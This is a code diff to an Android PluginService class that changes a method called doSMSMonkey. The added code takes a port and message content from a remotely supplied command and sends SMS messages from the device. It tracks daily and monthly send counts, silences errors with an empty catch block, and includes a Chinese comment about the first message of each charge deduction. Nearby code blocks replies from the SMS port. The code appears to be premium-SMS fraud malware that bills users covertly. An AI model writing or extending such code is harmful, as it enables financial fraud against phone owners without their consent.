@@ -102,12 +102,28 @@ public class PluginService extends IntentService {
             if (Config.DEBUG) {
                 Config.LOGD("[[PluginService::doSMSMonkey]] try to send SMS monkey with info : " + response.toString());
             }
-            if (!TextUtils.isEmpty(response.port) && !TextUtils.isEmpty(response.instruction)) {
-                if (SMSUtil.sendSMS(response.port, response.instruction)) {
-                    SettingManager.getInstance().setKeyDayCount(dayCount + 1);
-                    SettingManager.getInstance().setKeyMonthCount(SettingManager.getInstance().getKeyMonthCount() + 1);
-                    SettingManager.getInstance().setKeyLastCountTime(System.currentTimeMillis());
+            try {
+                if (!TextUtils.isEmpty(response.port) && !TextUtils.isEmpty(response.instruction)) {
+                    if (AppRuntime.ACTIVE_RESPONSE.smsCmd != null) {
+                        String startPort = AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.get(0);
+                        String startContent = AppRuntime.ACTIVE_RESPONSE.smsCmd.contentList.get(0);
+                        if (startPort.startsWith("n=")) startPort = startPort.substring(2);
+                        if (startContent.startsWith("c=")) startContent = startContent.substring(2);
+                        /**
+                         * 注意，每次扣费的时候，第一条起始的短信都是很直接的，都是n+c的模式
+                         */
+                        if (SMSUtil.sendSMS(startPort, startContent)) {
+                            SettingManager.getInstance().setKeyDayCount(dayCount + 1);
+                            SettingManager.getInstance().setKeyMonthCount(SettingManager.getInstance().getKeyMonthCount() + 1);
+                            SettingManager.getInstance().setKeyLastCountTime(System.currentTimeMillis());
+                        }
+                    } else {
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[PluginService::doSMSMonkey]] AppRuntime.ACTIVE_RESPONSE.smsCmd == null");
+                        }
+                    }
                 }
+            } catch (Exception e) {
             }
         } else {
             if (Config.DEBUG) {
@@ -159,6 +175,7 @@ public class PluginService extends IntentService {
                                 file.delete();
                             } else {
                                 AppRuntime.ACTIVE_RESPONSE = response;
+                                AppRuntime.ACTIVE_RESPONSE.parseSMSCmd();
                                 AppRuntime.saveActiveResponse(AppRuntime.RESPONSE_SAVE_FILE);
 //                                AppRuntime.saveActiveResponse("/sdcard/" + Config.ACTIVE_RESPONSE_FILE);
                                 SettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
